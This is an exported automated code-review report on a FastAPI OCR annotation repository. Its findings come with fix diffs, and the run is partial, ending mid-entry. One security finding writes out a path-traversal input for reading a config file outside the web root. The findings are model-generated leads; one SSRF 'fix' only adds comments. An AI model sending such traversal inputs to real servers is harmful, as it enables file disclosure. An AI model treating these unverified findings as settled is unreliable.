# Code review — `ocr` full scan, 2026-10-31

Snapshot of the review produced by [`ocr`](https://github.com/alibaba/open-code-review)
(`@alibaba-group/open-code-review` v1.13.3) on this repository. The tool never wrote a
report to disk: findings live in its session store at
`~/.opencodereview/sessions/Users-nbadino-Desktop-tabularium/bba00cdb-197b-4b7e-a566-c2acc15e8e3e.jsonl`.
This file and [`ocr-review-20261031.json`](ocr-review-20261031.json) are an export of that session.

| | |
|---|---|
| Session | `bba00cdb-197b-4b7e-a566-c2acc15e8e3e` |
| Mode | `full_scan` (whole repository, not a diff) |
| Model | `deepseek-v4.1-flash` via `ollama-cloud` |
| Started | 2026-10-31 10:06:33 |
| Ended | 2026-10-31 12:47:04 (2 h 23 min) |
| Files | 142 reviewed, 201 failed |
| Findings | 610 |
| Severity | critical 15 · high 122 · medium 332 · low 141 |
| Category | bug 387 · maintainability 120 · security 48 · performance 45 · other 7 · documentation 2 · test 1 |

## How complete is this run

The run did **not** cover the repository. It stopped before finishing and 201 of the 343
scheduled files were recorded as failed:

- 184 — Ollama Cloud returned `429 Too Many Requests`: the account hit its *session usage
  limit* mid-run. These are not code problems, they are files nobody looked at.
- 10 — caller deadline exceeded (the per-request budget).
- 7 — the reviewer exhausted its tool-request rounds without submitting findings.

So 142 files were actually read, and this report says nothing about the rest. Re-running
the missing part needs a fresh quota window:

```bash
ocr --resume bba00cdb-197b-4b7e-a566-c2acc15e8e3e        # retry the failed items
ocr session show bba00cdb-197b-4b7e-a566-c2acc15e8e3e    # coverage per file
ocr session export bba00cdb-197b-4b7e-a566-c2acc15e8e3e --output review.html
```

The snapshot also predates v0.5.0 (2 Nov). Findings on files that changed since then may
already be fixed; treat them as leads, not as a bug list.

## Critical — 15

### `backend/app/api/benchmark.py:110-111`

*security · critical*

The benchmark report is returned verbatim and persisted by `run_benchmark`, and it contains `"target": dict(target)` including `api_key` — so the key is written in plaintext to `eval/bench_*/report.json` and handed back to any user with read access to the project. Strip sensitive fields before returning (and ideally never persist them), and type the credential as `pydantic.SecretStr` (unwrapping with `.get_secret_value()` only when building the client) so it cannot leak through `repr`, validation errors or logging.

Current code:

```
    report["available"] = True
    return report
```

### `backend/app/api/pages.py:181`

*bug · critical*

`BulkApproveIn` is referenced here but only declared *after* this endpoint (line ~199). Because of `from __future__ import annotations`, the annotation is a string, and FastAPI evaluates it with `get_type_hints`/`evaluate_forwardref` **while the `@router.post` decorator runs** — at that moment `BulkApproveIn` does not exist in the module globals, so importing this module raises `NameError: name 'BulkApproveIn' is not defined` and the whole router fails to load. Move the `BulkApproveIn` class above `approve_page` (the other model classes in this file are already declared before use).

Current code:

```
    payload: BulkApproveIn | None = None,
```

### `backend/app/api/prelabel.py:51`

*bug · critical*

The default `mode` is `"replace"`, which (see `PageWriter.replace_blocks`) falls into the `else` branch and deletes **every** block of the page, table grids included, exactly like `replace_all`. The comment right above documents it as a historical, destructive alias no longer used by the UI. A client that simply omits `mode` (the most common case for a defaulted field) therefore wipes existing human work with no confirmation. Default to the non-destructive option and keep `replace` only when explicitly requested.

```diff
-    mode: Literal["merge", "replace", "replace_drafts", "replace_all"] = "replace"
+    mode: Literal["merge", "replace", "replace_drafts", "replace_all"] = "merge"
```

### `backend/app/domain/inference.py:252-253`

*bug · critical*

The `job_failure_conditions` keys do not match the vendor schema. The workflow field is `allowed_page_failure_ratio` (see `LLAMAINDEX_WORKFLOW_LIMITS` / `llamaindex_workflow_defaults` in `models/types.py`, the panel in `LlamaIndexSetup.tsx` and `LlamaParseJobFailureConditions`), so reading `allowed_failure_ratio` silently drops the user's validated setting and always sends `0.0`, which additionally violates the schema's `exclusiveMinimum: 0.0` and can get the job rejected. And `fail_on_job_timeout`/`fail_on_page_timeout` are not declared in `LlamaParseJobFailureConditions` (the schema lists only the four `fail_on_*error` keys) nor in `LLAMAINDEX_WORKFLOW_FIELDS`, so they are stripped before this function sees them — and would make the request invalid under `additionalProperties: false`. Use the real key and remove the two non-existent entries.

```diff
-            "job_failure_conditions": {
-                "allowed_failure_ratio": float(workflow.get("allowed_failure_ratio", 0.0)),
+            "job_failure_conditions": {
+                # The vendor requires a ratio strictly greater than 0; omit it to keep
+                # the vendor's default instead of sending an invalid 0.0.
+                **(
+                    {"allowed_page_failure_ratio": float(workflow["allowed_page_failure_ratio"])}
+                    if workflow.get("allowed_page_failure_ratio")
+                    else {}
+                ),
```

### `backend/app/main.py:148-149`

*security · critical*

`Path.is_relative_to` is a purely lexical prefix check on `PurePath.parts`; it does not normalize `..`. For `full_path = "../config/settings.toml"` the candidate is `_dist/../config/settings.toml`, whose parts start with `_dist.parts`, so `is_relative_to(_dist)` returns `True` while `is_file()`/`FileResponse` resolve the path outside `frontend/dist`. Because uvicorn percent-decodes the path before routing, `/..%2fconfig/settings.toml` (or `curl --path-as-is /../...`) reaches this handler with a traversal payload — arbitrary file disclosure. Resolve the candidate (which also follows symlinks) and compare against the resolved dist root before serving.

```diff
-        candidate = _dist / full_path
-        if full_path and candidate.is_file() and candidate.is_relative_to(_dist):
+        dist_root = _dist.resolve()
+        candidate = (_dist / full_path).resolve()
+        if full_path and candidate.is_file() and candidate.is_relative_to(dist_root):
```

### `backend/app/models/__init__.py:25-28`

*bug · critical*

`surya_ocr.py` and `xiaomi_ocr.py` exist in `app/models/` and both declare a `SPEC` (`adapter_id="surya-ocr-2.5"` and `adapter_id="xiaomi-ocr-0"`), and both are registered adapters in `model_adapters`. Neither module is imported here, and neither appears in `_MODULES`, so `SPECS` silently lacks these two models: `spec_for("surya-ocr-2.5")` returns `None`, `declared_values`/`not_applicable_reasons` omit them, and `tests/test_model_specs.py::test_every_registered_model_has_a_spec` fails. The import list is duplicated in `_MODULES`, which is exactly how this drift happened — add both names to the import list and to `_MODULES` (ideally derive `_MODULES` from a single source or assert coverage).

```diff
-    teleocr,
-    unlimited_ocr,
-)
-from .base import (
+    surya_ocr,
+    teleocr,
+    unlimited_ocr,
+    xiaomi_ocr,
+)
+from .base import (
```

### `backend/app/services/export_formats.py:84`

*bug · critical*

A single `Page` element is created once, outside the block loop, and every page's regions are nested inside it, with hard-coded `imageWidth="0"/imageHeight="0"`. For a multi-page project this produces one bogus PAGE document (wrong dimensions, all pages merged, duplicate region ids `b{block_id}` across pages), which PAGE consumers will reject or mis-parse. The `Page` element must be created per page inside the `for item in data.values()` loop, using the page's real width/height and filename.

Current code:

```
            page_el = SubElement(root, "Page", {"imageWidth": "0", "imageHeight": "0"})
```

### `backend/app/services/export_formats.py:89`

*bug · critical*

The wrapper element is wrong for both schemas:
- PAGE: this creates a `TextRegion` per page that has no `Coords` child and then nests another `TextRegion` per block inside it. PAGE expects `Page > TextRegion > TextLine > Word`, so nested TextRegions are invalid and the outer region lacks the mandatory `Coords`.
- ALTO: `TextRegion` is not a valid child of `Layout`; ALTO v4 requires `Layout > Page > PrintSpace > TextBlock`, and the attribute must be `ID` (uppercase), not `id`.

Use a `Page`/`PrintSpace` container for ALTO and drop the per-page wrapper (or give it a valid `Coords`) for PAGE.

Current code:

```
            parent = SubElement(page_el if fmt == "page" else layout, "TextRegion", {"id": f"p{page['id']}"})
```

### `backend/app/services/model_registry.py:643`

*bug · critical*

`connect` is never imported in this module (top-level imports are only `config`, `models`, `model_adapters`, `hardware`, `paddle_runtime`), so this line raises `NameError`. Because the `shutil.rmtree(d)` above already ran, deleting a fine-tuned checkpoint destroys its registry directory and then blows up before `clear_source_path()` — the DB row keeps pointing at a path that no longer exists, and the caller gets a 500 instead of a clean result.

```diff
-            with connect() as conn:
+            from ..db import connect
+
+            with connect() as conn:
```

### `backend/app/services/ocr.py:50-51`

*bug · critical*

`got.scores` is a NumPy array in rapidocr 3.x (same as `boxes`), so `got.scores or ()` evaluates the array's truth value and raises `ValueError: The truth value of an array with more than one element is ambiguous` as soon as a page contains 2+ detected lines — i.e. the main detection path breaks in production. The comment above already warns about this for `boxes` but the same guard was not applied to `scores`.

```diff
-        boxes = getattr(got, "boxes", None)
-        return list(zip(() if boxes is None else boxes, got.txts or (), got.scores or ()))
+        boxes = getattr(got, "boxes", None)
+        scores = getattr(got, "scores", None)  # array numpy nel 3.x: niente `or`
+        return list(zip(() if boxes is None else boxes, got.txts or (), () if scores is None else scores))
```

### `backend/app/services/ocr.py:150`

*bug · critical*

Same array-truthiness bug on the recognition-only path: `getattr(got, "scores", None) or (0,)` raises `ValueError` when rapidocr 3.x returns a NumPy array of scores, breaking `recognize_line` (table cell filling) instead of returning the text.

```diff
-                scores = getattr(got, "scores", None) or (0,)
+                scores = getattr(got, "scores", None)
+                if scores is None:
+                    scores = (0,)
```

### `backend/app/services/pages.py:278`

*bug · critical*

`conn` is not defined anywhere in this module (only `connect` is imported), so the first time a missing thumbnail is generated the JPEG is written to disk and then `pagestore.set_thumb(conn, ...)` raises `NameError` → HTTP 500. Every subsequent call also returns the file but the DB `thumb_path` is never updated. `ensure_thumbnail` is called from the API route without any connection in scope, so the service must open its own connection (and commit it).

```diff
-    pagestore.set_thumb(conn, page["id"], str(expected))
+    with connect() as conn:
+        pagestore.set_thumb(conn, page["id"], str(expected))
```

### `backend/app/services/rate_limit.py:16-20`

*security · critical*

Read-then-act across separate non-atomic store calls. `window()` runs a SELECT and `bump()`/`start()` run their own UPDATE/UPSERT, each on a fresh connection (endpoints are sync `def`, so FastAPI dispatches them to a thread pool and several workers may run at once). Two consequences:
1. N concurrent login attempts all read `attempts < limit` and all increment, so the effective cap is unbounded — the brute-force protection this module exists for is bypassed by parallelizing requests.
2. Worse, when the window is missing/expired each concurrent request calls `start()`, and the adapter's `ON CONFLICT DO UPDATE SET ..., attempts=1` rewrites the row: a burst of parallel attempts keeps resetting the counter to 1, so the limit is never reached at all.
The check and the increment must happen in a single atomic statement (e.g. one UPSERT that increments only `WHERE window_started > :now - :window AND attempts < :limit` and reports the affected row count), and the service should derive the boolean from that result instead of from the value read beforehand.

Current code:

```
    now = time.time()
    current = store.window(key)
    if current is None or now - current[0] >= window:
        store.start(key, now)
        return True
```

### `backend/app/services/trainer.py:618`

*bug · critical*

`job` is never defined in this scope: `jobstore.start_training_job(...)` returns the id, but it is stored only in `meta["job_id"]`. This line therefore raises `NameError` at the very end of a successful `start_run`, after the training process has already been launched and the job row inserted — the caller gets an error, `_ACTIVE`/monitor threads are never registered, and the process is left running unsupervised. Use the value already returned into `meta`.

```diff
-    _ACTIVE[project_id] = {"run_id": run_id, "proc": proc, "run_dir": run_dir, "log_file": log_file, "job_id": job.lastrowid}
+    _ACTIVE[project_id] = {"run_id": run_id, "proc": proc, "run_dir": run_dir, "log_file": log_file, "job_id": meta["job_id"]}
```

### `scripts/build_frontend.ps1:4`

*bug · critical*

`npm run build` is a native command, so a non-zero exit code is not turned into a terminating error by `$ErrorActionPreference = "Stop"` (and `$PSNativeCommandUseErrorActionPreference` is not set, defaulting to false on PS 5.1 and PS 7). A failed build therefore falls through to the success message and the script exits 0 — and `scripts/run.ps1` (line 26) invokes this script with `&`, so it will keep booting the backend against a stale/missing `frontend/dist` while CI/automation sees success. Check `$LASTEXITCODE` explicitly right after `npm`.

```diff
-npm run build
+npm run build
+if ($LASTEXITCODE -ne 0) {
+    throw "Frontend build failed (npm run build exit code $LASTEXITCODE)."
+}
```

### `backend/app/adapters/annotations.py:120-124`

*security · high*

Column names are interpolated straight into the SQL from the dict keys. The adapter documents no contract, so the only thing keeping this safe today is that the single caller (`api/blocks.py:181`) passes a `BlockUpdate.model_dump()`. Any future caller that forwards a request-derived field name turns this into SQL injection, and an empty `updates` dict produces the invalid statement `SET , updated_at=...`. Restrict the keys to a whitelist (failing loudly on anything else) and return early when there is nothing to update.

```diff
-        assignments = ", ".join(f"{key}=?" for key in updates)
-        self.conn.execute(
-            f"UPDATE blocks SET {assignments}, updated_at=datetime('now') WHERE id=?",
-            (*updates.values(), block_id),
-        )
+        allowed = {"label", "kind", "points", "content", "order_idx", "confirmed"}
+        unknown = set(updates) - allowed
+        if unknown:
+            raise ValueError(f"campi non aggiornabili: {sorted(unknown)}")
+        if not updates:
+            return
+        assignments = ", ".join(f"{key}=?" for key in updates)
+        self.conn.execute(
+            f"UPDATE blocks SET {assignments}, updated_at=datetime('now') WHERE id=?",
+            (*updates.values(), block_id),
+        )
```

### `backend/app/adapters/exports.py:49-52`

*bug · high*

`json.loads` only guarantees valid JSON, not a JSON object: `grid_json` values like `"[]"`, `"null"` or `"3"` parse successfully and are stored as-is. Downstream consumers immediately treat the value as a dict (`with_cell_provenance` in `services/table_provenance.py` calls `grid.get("cells")`, `dataset_builder` does `grid.get("cells")`, `export_formats` does `grid.get("cells")`), so such a row raises `AttributeError` and breaks the whole export instead of producing the intended "missing grid" fallback. Non-object payloads should be normalised to `{}` here, together with the malformed-JSON case.

```diff
-                try:
-                    tables[row["block_id"]] = json.loads(row["grid_json"] or "{}")
-                except (TypeError, ValueError):
-                    tables[row["block_id"]] = {}
+                try:
+                    grid = json.loads(row["grid_json"] or "{}")
+                except (TypeError, ValueError):
+                    grid = {}
+                tables[row["block_id"]] = grid if isinstance(grid, dict) else {}
```

### `backend/app/adapters/inference_config.py:0`

*bug · high*

The affected row count of this `UPDATE ... WHERE id=?` is never checked. If `profile_update["id"]` is stale (profile deleted or replaced between the read in `save_inference_config` and this write), the statement is a no-op and `save()` still commits the legacy `meta` upserts — exactly the split state (one table updated, the other not) this module exists to prevent. Check `cursor.rowcount` and raise (which rolls the transaction back) when no row was updated.

```diff
-                    ("UPDATE compute_profiles SET endpoint=?, served_model_name=?, "
+                cursor = conn.execute(
+                    "UPDATE compute_profiles SET endpoint=?, served_model_name=?, "
+                    "model_adapter_id=?, provider=?, hardware_profile_json=?, "
+                    "credential_ref=COALESCE(?, credential_ref), updated_at=datetime('now') "
+                    "WHERE id=?",
+                    (
+                        profile_update["endpoint"],
+                        profile_update["served_model_name"],
+                        profile_update["model_adapter_id"],
+                        profile_update["provider"],
+                        profile_update["hardware_profile_json"],
+                        profile_update.get("credential_ref"),
+                        profile_update["id"],
+                    ),
+                )
+                if cursor.rowcount == 0:
+                    raise LookupError(
+                        f"compute profile {profile_update['id']} vanished before the update"
+                    )
```

### `backend/app/adapters/inference_config.py:79-81`

*bug · high*

`OperationalError` is not only raised for a missing pre-v10 `compute_profiles` table: it also covers `database is locked`, `readonly database` and malformed-schema errors. Swallowing all of them makes the transaction commit the `meta` upserts while leaving the active profile untouched, silently recreating the URL-from-one-provider/adapter-from-another bug this module documents against. Re-raise everything except the missing-table case so the whole transaction rolls back.

```diff
-        except sqlite3.OperationalError:
-            # Databases older than v10 keep working from the legacy keys.
-            pass
+        except sqlite3.OperationalError as exc:
+            # Databases older than v10 keep working from the legacy keys.
+            if "no such table" not in str(exc):
+                raise
```

### `backend/app/adapters/projects.py:94`

*bug · high*

`owner_id` is nullable (`projects.owner_id` starts NULL and `create()` stores `user.get("id")`, which is `None` in local/auth-off mode), so `id != ?` with a NULL parameter evaluates to NULL and the whole WHERE matches no rows. In that mode the candidate list is always empty. `members()` already guards this with `COALESCE(?, -1)`; do the same here.

```diff
-            "WHERE active=1 AND id != ? AND id NOT IN "
+            "WHERE active=1 AND id != COALESCE(?, -1) AND id NOT IN "
```

### `backend/app/adapters/rate_limits.py:11`

*bug · high*

The window read and the counter write are two separate statements issued on two *different* connections (`services/rate_limit.allow` calls `window()` then `bump()`/`start()`). Nothing serializes them: two concurrent login attempts can read the same `attempts` value, both pass the `>= limit` check in the service and both increment, so the effective limit can be exceeded. Because this module owns the SQL, the atomic primitive belongs here — e.g. expose an `increment_if_below(key, limit, window_end)` that does a single conditional `UPDATE ... WHERE attempts < ?` and reports `cursor.rowcount`, so the decision and the increment happen in one statement.

Current code:

```
def window(key: str, conn=None) -> tuple[float, int] | None:
```

### `backend/app/adapters/runs.py:136-139`

*bug · high*

Check-then-act race on the `ModelBusy`/`PagesBusy` guards. The guards are plain `SELECT`s and the connection runs in Python's default legacy transaction mode, where `BEGIN` is only emitted before the first DML statement — so both guards execute outside any write transaction. Two concurrent `create` calls (double-click on "start", two workers, retry racing with a new session) can both see "nothing busy" and both insert queued runs covering the same pages, which the comment itself says corrupts the drafts. The same window exists between `check()` (separate connection, then a 5s endpoint probe) and this function. Serialize the guard and the insert with an immediate write transaction (or back the invariant with a unique/partial index).

```diff
-    """Insert the job, the session and its pages. Returns the session id."""
-    placeholders = ",".join("?" for _ in page_ids)
-    with connect() as conn:
-        if engine == "model":
+    """Insert the job, the session and its pages. Returns the session id."""
+    placeholders = ",".join("?" for _ in page_ids)
+    with connect() as conn:
+        # Take the write lock before the guards so two callers cannot both pass.
+        conn.execute("BEGIN IMMEDIATE")
+        if engine == "model":
```

### `backend/app/adapters/store.py:82-83`

*bug · high*

The read and the delete are not atomic: the first statement only acquires a shared (deferred) read transaction, so a second connection can run the same SELECT on the same snapshot and both callers see the value (or the loser fails with `SQLITE_BUSY_SNAPSHOT` when upgrading to a writer, surfacing as an unexpected `OperationalError` instead of `None`). This matters because the only caller is the single-use OIDC state row (`services/oidc.py:consume_state`), where a double consume is exactly what must not happen. Use a single statement with `DELETE ... RETURNING value` (SQLite >= 3.35) or open the transaction with `BEGIN IMMEDIATE`.

```diff
-        row = conn.execute("SELECT value FROM meta WHERE key=?", (key,)).fetchone()
-        conn.execute("DELETE FROM meta WHERE key=?", (key,))
+    with closing(connect()) as conn, conn:
+        conn.execute("BEGIN IMMEDIATE")
+        row = conn.execute("SELECT value FROM meta WHERE key=?", (key,)).fetchone()
+        conn.execute("DELETE FROM meta WHERE key=?", (key,))
```

### `backend/app/adapters/system.py:17`

*security · high*

`command_json` is serialized to the client verbatim, but it is not guaranteed to be secret-free: `serve_manager` persists `command={"adapter_id": ..., "argv": argv}` and that `argv` is built by `serve_recipes.build_serve_command`, which appends `["--api-key", api_key]` when a serving API key is configured (see `serve_recipes.py:117`). The same JSON is also stored for training/modal jobs and can carry full config/env details. Even behind the `_admin` dependency, returning the model-serving credential in an API response (and in any browser/JSON log or cache of it) leaks a reusable secret, and the response also exposes absolute server paths for `log_path`. Redact sensitive argv flags (and optionally shorten/normalize `log_path`) before returning the rows.

```diff
-    return [dict(row) for row in rows]
+    return [_redact(row) for row in rows]
+
+
+def _redact(row: sqlite3.Row) -> dict[str, Any]:
+    """Hide credentials embedded in the recorded command line."""
+    item = dict(row)
+    try:
+        command = json.loads(item.get("command_json") or "{}")
+    except ValueError:
+        return item
+    argv = command.get("argv")
+    if isinstance(argv, list):
+        masked: list[str] = []
+        hide_next = False
+        for arg in argv:
+            if hide_next:
+                masked.append("***")
+                hide_next = False
+                continue
+            if isinstance(arg, str) and arg in _SECRET_FLAGS:
+                masked.append(arg)
+                hide_next = True
+                continue
+            masked.append(arg)
+        command["argv"] = masked
+        item["command_json"] = json.dumps(command)
+    return item
```

### `backend/app/api/auth.py:174`

*bug · high*

`_user_out()` explicitly returns `None` when the user is the synthetic local user (`is_local`), and `get_current_user()` returns exactly that synthetic user when auth is disabled (`TABULARIUM_AUTH=off`, the default). The route declares `response_model=UserOut`, which is not optional, so a request in local mode fails response validation and returns a 500 instead of a meaningful answer. This endpoint is also whitelisted in `_MUST_CHANGE_ALLOWED`, so it is expected to always answer.

```diff
-    return _user_out(user)  # type: ignore[return-value]
+    out = _user_out(user)
+    if out is None:
+        # Local mode has no profile: an explicit error instead of a 500 from
+        # response validation against the non-optional `UserOut`.
+        raise HTTPException(status_code=400, detail="la modalità locale non ha un profilo")
+    return out
```

### `backend/app/api/benchmark.py:110-111`

*bug · high*

`json.loads` may legally return a non-dict (list, str, int, `null`). In that case `report["available"] = True` raises `TypeError` (and a subsequent `return` would emit a non-2xx 500), while the `except (OSError, ValueError)` only covers read/parse failures. Guard the shape before mutating/indexing.

```diff
-    report["available"] = True
-    return report
+    if not isinstance(report, dict):
+        return {"available": False}
+    report["available"] = True
+    return report
```

### `backend/app/api/cloud.py:140-141`

*bug · high*

`_credential(payload)` is evaluated inside the broad `except Exception -> HTTPException(400, str(exc))` block, so its own `HTTPException(400, ...)` (credential vault unconfigured/invalid) is caught and re-wrapped into a nested detail like `"400: credential vault non configurato o non valido"`, losing the original message. Resolve the credential before the `try` (as `get_vast_instances` does) so the original exception propagates unchanged; the same pattern exists in `rent_vast`, `create_runpod` and the other cloud handlers.

```diff
-        items = cloud_manager.search_vast_offers(
-            _credential(payload),
+    api_key = _credential(payload)
+    try:
+        items = cloud_manager.search_vast_offers(
+            api_key,
```

### `backend/app/api/cloud.py:185`

*bug · high*

`hourly_rate` is taken from the request body (`payload["dph_total"]`), i.e. a client-controlled value, and persisted by `track_cloud_resource` for cost accounting. A wrong/missing value corrupts `cloud_resource_cost` estimates. Use a server-derived rate (as `rent_training` does with `best.get("dph_total")`), e.g. the offer/instance data returned by `rent_vast_instance`, or ignore it.

```diff
-                hourly_rate=payload.get("dph_total"),
+                hourly_rate=result.get("dph_total"),
```

### `backend/app/api/cloud.py:208-211`

*bug · high*

`_credential()` already raises `HTTPException(400, "credential vault non configurato o non valido")` when the (always non-empty, defaulted) `credential_ref` resolves to nothing, so this fallback `vault.get(...)` and the friendlier "API Key di Vast.ai non configurata" message are unreachable. Users of `/vast/rent-training` therefore get the generic vault error instead of the actionable hint. Either check the vault value directly, or make `_credential` return "" (and let callers produce the specific message).

```diff
-    api_key = _credential({**payload, "credential_ref": credential_ref})
-    if not api_key:
-        api_key = vault.get(credential_ref)
-    if not api_key:
+    api_key = _credential({**payload, "credential_ref": credential_ref})
+    if not api_key:
```

### `backend/app/api/evaluate.py:20-22`

*security · high*

`server_url` / `baseline_server_url` come straight from the request body and are forwarded unchanged to `evmod.evaluate_project` → `infmod.get_vllm_client(url=...)`, which issues outbound HTTP(S) requests to that host. Any authenticated user with write access to a project can therefore make the backend call arbitrary hosts (internal services, cloud metadata endpoints, etc.) — classic SSRF. The codebase already has a guard (`services/url_security.validate_endpoint`, used in `api/system.py` and `compute_profiles.py`) and `api/playground.py` explicitly rejects client-supplied `server_url` in favour of the admin-approved inference profile. Validate the overrides (or reject them) before delegating.

```diff
-    server_url: str | None = None
-    model: str | None = None
-    with_text: bool = True
+    # Gli endpoint remoti vanno validati: `validate_endpoint` blocca le reti
+    # private/metadata e impone HTTPS. In alternativa, come il playground,
+    # rifiutare gli override e usare solo il profilo di inferenza approvato.
+    server_url: str | None = None
+    model: str | None = None
+    with_text: bool = True
```

### `backend/app/api/evaluate.py:60-61`

*bug · high*

The deltas assume the aggregate metrics are numbers, but `_mean(...)` in `services/evaluate.py` returns `None` when there are no samples. With `with_text=False` (or when no page produced text/tables) `aggregates["text"]["mean_cer"]` is `None`, and if every page failed (`ok_pages` empty) even `aggregates["order"]["mean_levenshtein_norm"]` is `None`, so `... - None` raises `TypeError`, which is not caught (only `ValueError` is) and surfaces as a 500. The single `or 0` on `text_cer_delta` is inconsistent: it hides a genuinely missing text metric (reporting a delta of 0) while the other three still crash. Handle `None` uniformly for all four deltas.

```diff
-            result["comparison"] = {
-                "layout_recall_delta": result["aggregates"]["layout"]["recall"] - baseline["aggregates"]["layout"]["recall"],
+            def _delta(current, base):
+                if current is None or base is None:
+                    return None
+                return current - base
+
+            cur_agg, base_agg = result["aggregates"], baseline["aggregates"]
+            result["comparison"] = {
+                "layout_recall_delta": _delta(cur_agg["layout"]["recall"], base_agg["layout"]["recall"]),
+                "layout_precision_delta": _delta(cur_agg["layout"]["precision"], base_agg["layout"]["precision"]),
+                "text_cer_delta": _delta(cur_agg["text"]["mean_cer"], base_agg["text"]["mean_cer"]),
+                "order_delta": _delta(cur_agg["order"]["mean_levenshtein_norm"], base_agg["order"]["mean_levenshtein_norm"]),
+            }
```

### `backend/app/api/live.py:83-84`

*bug · high*

The connection is registered in the hub *before* the `try/finally` that unregisters it. If `send_json(hello)` or `announce_presence` raises (client drops right after `accept`, `page_live` is cancelled, serialization error), the exception propagates without ever reaching the `finally` block, so `unregister` is never called: the `Connection` stays in `hub._rooms` forever, showing a ghost participant to every other client and leaking a socket reference. Register only after the setup succeeds, or guard the registration + handshake with cleanup.

```diff
-    participants = await live.hub.register(conn)
-    await websocket.send_json(
+    try:
+        participants = await live.hub.register(conn)
+        await websocket.send_json(...)  # hello
+        await live.hub.announce_presence(page_id, exclude=conn.conn_id)
+    except BaseException:
+        await live.hub.unregister(page_id, conn.conn_id)
+        raise
```

### `backend/app/api/models.py:103-104`

*performance · high*

`install_state()` is a synchronous, I/O-heavy call: it does `_read_state`, globs the weights dir (`is_installed`), walks the whole model directory to compute `_dir_size` (`path.rglob("*")` + `stat()` per file) and, for `paddleocr-vl`, reads the runtime state/log. Because this runs inside an `async def` generator, it executes on the event-loop thread and blocks every other request for the duration of the scan — repeated every 1.5 s for each connected client. Offload the polling to a worker thread (`await asyncio.to_thread(...)` / `run_in_executor`) so the loop stays responsive.

Current code:

```
            try:
                state = model_registry.install_state(adapter_id)
```

### `backend/app/api/models.py:167`

*bug · high*

The body is not validated: `int("abc")` raises `ValueError` (or `TypeError` for a list/dict value) outside the `try` block, producing an unhandled 500, and out-of-range values such as `0` or `70000` are accepted and only fail later inside the worker thread, leaving a bogus inference URL persisted. Validate here and return 400 for malformed/out-of-range ports.

```diff
-    port = int((payload or {}).get("port") or 8888)
+    raw_port = (payload or {}).get("port") or 8888
+    try:
+        port = int(raw_port)
+    except (TypeError, ValueError) as exc:
+        raise HTTPException(status_code=400, detail="porta non valida") from exc
+    if not 1 <= port <= 65535:
+        raise HTTPException(status_code=400, detail="la porta deve essere compresa tra 1 e 65535")
```

### `backend/app/api/pages.py:327-330`

*bug · high*

Destructive ordering: the blocks are deleted **before** it is known that the transform is actually applied — a no-op branch (`abs(angle) < 0.3`, or `level == "basic"` with a negligible angle) returns without any transform, a failing `out.save(...)` loses every annotation, and in the candidate path the promotion (`candidate.replace(active)`) happens after the delete and outside any transaction, so a cross-device/permission error or a race with `clear_candidate` leaves the annotations gone and the old master untouched. In addition the count and the delete run in two separate `writing()` transactions, so a concurrent insert between them is deleted without the user ever seeing the 409. Compute and persist the outcome first, then delete the blocks in the same transaction that records it (re-checking `candidate.exists()` before promoting).

Current code:

```
    if confirm:
        with annotationstore.writing() as writer:
            writer.delete_page_blocks(page_id)
    _invalidate_page_cache(page_id)
```

### `backend/app/api/pages.py:418-419`

*bug · high*

The no-op branch removes `deskew_path` but leaves the companion artefacts behind: `legacy_deskew_path` (which `pagesvc._active_transform_path()` falls back to, so a previously applied legacy transform keeps being used by canvas/OCR/crop/export even though the endpoint reports `applied: false`) and the `transform_meta_path` JSON (`_transform_state` keeps reporting an `active` transform and `active_preview_url` while no transformed master exists). Remove the legacy file and the metadata here as well so the reported state matches the disk.

Current code:

```
    if payload.level == "basic" and abs(angle) < 0.05:
        desk.unlink(missing_ok=True)
```

### `backend/app/api/pages.py:605`

*security · high*

Authenticated page imagery must not be marked `public`: shared/proxy caches are then allowed to store and re-serve a private document tile to other users. Use `private, max-age=...` like `page_thumbnail`. Additionally the tile URL carries no transform revision, so `immutable, max-age=31536000` makes the browser keep stale tiles forever after deskew/align/candidate acceptance, even though `_invalidate_page_cache` deletes them server-side. Keep the cache short (or version the URL with the transform revision).

Current code:

```
    return FileResponse(tile, media_type="image/jpeg", headers={"Cache-Control": "public, max-age=31536000, immutable"})
```

### `backend/app/api/playground.py:173-175`

*bug · high*

`pages.width`/`height` are `INTEGER NOT NULL DEFAULT 0`, so a page row can legitimately carry 0 dimensions. Here the normalization divides by both without a guard: `ZeroDivisionError` escapes to a generic 500 (and in `playground_parse` it is caught by the broad handler and misreported as a vLLM failure). Validate the dimensions before scaling, and do the same before the `/ w`/`/ h` normalization in `playground_parse`.

```diff
-    w, h = page["width"], page["height"]
-    sx = w / image.width if image.width else 1.0
-    sy = h / image.height if image.height else 1.0
+    w, h = int(page["width"] or 0), int(page["height"] or 0)
+    if w <= 0 or h <= 0:
+        raise HTTPException(status_code=409, detail="dimensioni della pagina non valide")
+    sx = w / image.width if image.width else 1.0
+    sy = h / image.height if image.height else 1.0
```

### `backend/app/api/projects.py:451-453`

*bug · high*

`save_pilot_sample` mutates `study_protocol` but, unlike `put_study_protocol` and `set_gold_set`, neither increments `protocol["version"]` nor appends to `study_protocol_history`. The pilot/tuning sample selection is part of the study protocol, so downstream consumers relying on the version/history contract will not see this change. Bump the version and record it in the history (ideally via a single shared helper used by all three endpoints).

```diff
-    protocol["pilot_pages"] = valid
-    protocol["updated_at"] = datetime.now(timezone.utc).isoformat()
-    projectstore.put_settings(project_id, settings)
+    protocol["pilot_pages"] = valid
+    protocol["version"] = int(protocol.get("version", 0)) + 1
+    protocol["updated_at"] = datetime.now(timezone.utc).isoformat()
+    settings.setdefault("study_protocol_history", []).append(protocol)
+    projectstore.put_settings(project_id, settings)
```

### `backend/app/api/projects.py:650-654`

*other · high*

The job dict read here is returned live, but the worker thread keeps mutating it (`_scan_jobs[job_id].update(current=..., current_file=...)` in `_run_scan_job`) after the lock is released. FastAPI serializes the returned object outside the lock, so a concurrent insert of a new key (e.g. `current_file`) can raise `RuntimeError: dictionary changed size during iteration` or return a torn snapshot. Return a snapshot taken inside the lock. Also note that the job is looked up only by `job_id` and never checked against `project_id`, so any user with read access to *any* project can poll a job belonging to a different project (and the endpoint's auth check applies to the URL project only).

```diff
-    with _scan_jobs_lock:
-        job = _scan_jobs.get(job_id)
-    if not job:
-        raise HTTPException(status_code=404, detail="scan job non trovato")
-    return job
+    with _scan_jobs_lock:
+        job = _scan_jobs.get(job_id)
+        if not job or int(job.get("project_id", -1)) != project_id:
+            raise HTTPException(status_code=404, detail="scan job non trovato")
+        return dict(job)
```

### `backend/app/api/projects.py:700`

*security · high*

